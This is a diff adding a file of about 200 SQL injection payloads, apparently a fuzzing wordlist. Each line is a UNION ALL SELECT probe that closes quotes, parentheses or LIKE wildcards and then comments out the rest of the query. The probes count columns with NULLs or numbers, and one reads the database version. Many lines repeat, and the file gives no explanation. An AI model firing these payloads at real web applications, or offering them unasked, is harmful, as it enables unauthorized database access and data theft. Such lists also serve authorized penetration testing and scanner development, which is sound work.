@@ -1,0 +1,200 @@
+-9347'  )   union all select 3884,3884#
+-2333' union all select 9714,9714,9714--
+-7940'  )   union all select 6024--
+-5779  )   union all select 6089,6089--
+1%'   )    )    union all select null,null,null#
+1%"  )   union all select null,null--
+-2111' union all select 1061,1061,1061--
+-3752%' union all select 9351--
+-6368' union all select 6529,6529,6529--
+-9841 where 4612  =  4612 union all select 4612--
+-1579%'   )    )     )   union all select 7272#
+-6368' union all select 6529,6529,6529--
+-1634%' union all select 5937,5937,5937,5937--
+1" union all select null,null--
+-1876%'  )   union all select 6463--
+1'  )   union all select null--
+-5691' union all select 6610,6610#
+-4960'  )   union all select 5300--
+-6109 union all select 6784--
+-7345  )   union all select 3866#
+-1475"  )   union all select 8611,8611,8611#
+1"  )   union all select null--
+-7034'   )    )     )   union all select 4023#
+-6368' union all select 6529,6529,6529--
+-2725" union all select 3671,3671,3671,3671,3671#
+-2314%'   )    )    union all select 4612,4612--
+-1337"  )   union all select 7508--
+-3952'  )   union all select 6644,6644,6644--
+-7034'   )    )     )   union all select 4023#
+1   )    )     )   union all select null,null--
+-6890"   )    )     )   union all select 1115#
+1'   )    )    union all select null,null#
+-5779  )   union all select 6089,6089--
+-3721'  )   union all select 9050,9050--
+1' union all select null#
+-8943%'  )   union all select 7710,7710#
+1%"   )    )    union all select null,null#
+1"  )   union all select null,null,null--
+-3279" union all select 8568,8568,8568,8568--
+-1015"   )    )    union all select 6624,6624#
+-7418 union all select 1340,1340,1340,1340,1340#
+-7940'  )   union all select 6024--
+-3445 union all select 5505,5505,5505--
+-5211 union all select 1754--
+-3719" union all select 6609,6609,6609,6609#
+-5313'  )   union all select 7187,7187,7187#
+1"   )    )     )   union all select null#
+1"  )   union all select null,null--
+1" union all select null,null#
+1%'   )    )    union all select null,null#
+-8513' union all select 7414--
+1" union all select null,null#
+-7868" union all select 1805--
+1%"   )    )     )   union all select null#
+-4955%' union all select 5928,5928--
+-3279" union all select 8568,8568,8568,8568--
+-1634%' union all select 5937,5937,5937,5937--
+-9622' union all select 7208,7208,7208,7208#
+-8349  )   union all select 8126,8126#
+-3881   )    )     )   union all select 4438--
+-3860' union all select 3510,3510,3510#
+1 where 1992  =  1992 union all select null,null--
+-4473'  )   union all select 7656,7656#
+1'  )   union all select null,null,null--
+-6118 union all select 5906,5906,5906,5906,5906#
+-7868" union all select 1805--
+1"   )    )    union all select null--
+1%' union all select null,null,null--
+1 union all select null,null,null,null,null#
+-6263" union all select 8005,8005#
+1  )   union all select null,null,null,null#
+-1641' union all select 4835#
+-4031%" union all select 9566--
+-1171' union all select 3958,3958,3958,3958,3958--
+1  )   union all select null,null,null,null#
+1 union all select null,null--
+-8124  )   union all select 7251,7251,7251#
+-4394'   )    )    union all select 3409,3409--
+-2643%" union all select 7779,7779--
+1%'   )    )     )   union all select null#
+1'   )    )     )   union all select null,null--
+1'  )   union all select null,null,null,null--
+-6118 union all select 5906,5906,5906,5906,5906#
+1%' union all select null#
+1' union all select null,null,null,null,null,null#
+-3102  )   union all select 6707,6707,6707,6707--
+1'  )   union all select null,null,null,null#
+-6890"   )    )     )   union all select 1115#
+1"  )   union all select null,null--
+1" union all select null,null,null--
+-4960 union all select 4031,4031#
+-4826 union all select 4532,4532,4532,4532,4532--
+1 where 7516  =  7516 union all select null#
+1" union all select null#
+-6220' union all select 1462,1462#
+-4058  )   union all select 9184--
+-2111' union all select 1061,1061,1061--
+-3391' union all select 2024,2024--
+-5211 union all select 1754--
+-3881   )    )     )   union all select 4438--
+-5292'  )   union all select 1439,1439,1439,1439#
+-2359' union all select 2687,2687,2687#
+union all select @@version--
+-5643'   )    )    union all select 1515,1515#
+-1184"   )    )     )   union all select 1482--
+-3988'   )    )    union all select 1113#
+-6662"   )    )    union all select 6755--
+-4955%' union all select 5928,5928--
+-8513' union all select 7414--
+-9347'  )   union all select 3884,3884#
+-4127%' union all select 9558,9558,9558#
+-4058  )   union all select 9184--
+-1337"  )   union all select 7508--
+1'  )   union all select null,null,null--
+1'   )    )     )   union all select null,null#
+-8124  )   union all select 7251,7251,7251#
+1"  )   union all select null,null--
+-3035"  )   union all select 7912,7912,7912#
+-7138" union all select 2341,2341,2341,2341--
+1'   )    )     )   union all select null--
+-7940'  )   union all select 6024--
+1  )   union all select null,null,null--
+1'  )   union all select null--
+-1337"  )   union all select 7508--
+1"   )    )    union all select null#
+-4571' union all select 3227,3227,3227,3227--
+1%' union all select null,null,null--
+-3279" union all select 8568,8568,8568,8568--
+-8661" union all select 5731,5731--
+1"   )    )     )   union all select null,null--
+-9932" union all select 4049,4049,4049--
+-6890"   )    )     )   union all select 1115#
+-9361"   )    )    union all select 3112#
+-6122"  )   union all select 6578,6578--
+-1304'  )   union all select 7639#
+-8513' union all select 7414--
+-6368' union all select 6529,6529,6529--
+-3205"  )   union all select 5233,5233,5233,5233#
+-9371'  )   union all select 5900,5900,5900#
+-9856" union all select 9753--
+1   )    )     )   union all select null#
+1"  )   union all select null,null--
+-6220' union all select 1462,1462#
+1  )   union all select null,null,null,null,null#
+-3952'  )   union all select 6644,6644,6644--
+1'   )    )     )   union all select null,null#
+-8684 union all select 9519,9519,9519,9519--
+-4960'  )   union all select 5300--
+-4596" union all select 5761#
+-8893%'  )   union all select 1254,1254--
+-3954'   )    )    union all select 2417,2417--
+-1634%' union all select 5937,5937,5937,5937--
+-9005 union all select 4410#
+-2782" union all select 2109,2109,2109#
+-3672"   )    )    union all select 6093#
+-5438"  )   union all select 3170,3170--
+-8684 union all select 9519,9519,9519,9519--
+1   )    )     )   union all select null,null#
+1"   )    )     )   union all select null#
+1' where 8159  =  8159 union all select null#
+1%'  )   union all select null#
+-8301'  )   union all select 1806,1806--
+-9856" union all select 9753--
+-1184"   )    )     )   union all select 1482--
+-5438"  )   union all select 3170,3170--
+-5731" union all select 3083,3083,3083#
+1'  )   union all select null#
+1'  )   union all select null,null,null--
+-5313'  )   union all select 7187,7187,7187#
+1%"  )   union all select null,null#
+1%'  )   union all select null,null#
+-5643'   )    )    union all select 1515,1515#
+-8902 union all select 4339,4339,4339#
+-5731" union all select 3083,3083,3083#
+-7868" union all select 1805--
+1 union all select null,null,null,null--
+1'   )    )     )   union all select null--
+-4413%'   )    )    union all select 1345,1345#
+-1337"  )   union all select 7508--
+1%"   )    )    union all select null,null,null#
+1'  )   union all select null,null,null,null#
+1%" union all select null,null,null,null,null--
+-2667  )   union all select 5848,5848,5848,5848--
+1'  )   union all select null,null,null,null,null#
+-9622' union all select 7208,7208,7208,7208#
+-1844'  )   union all select 9572,9572,9572,9572#
+-2050' union all select 5606#
+1'  )   union all select null,null,null,null--
+-8124  )   union all select 7251,7251,7251#
+-6368' union all select 6529,6529,6529--
+-2111' union all select 1061,1061,1061--
+1%" union all select null,null--
+-8378%'  )   union all select 5491#
+-4571' union all select 3227,3227,3227,3227--
+1'   )    )    union all select null,null#
+-8684 union all select 9519,9519,9519,9519--
+-7418 union all select 1340,1340,1340,1340,1340#
+-4960 union all select 4031,4031#
+-4692%"   )    )    union all select 1781,1781#
+-6775" union all select 7484,7484#
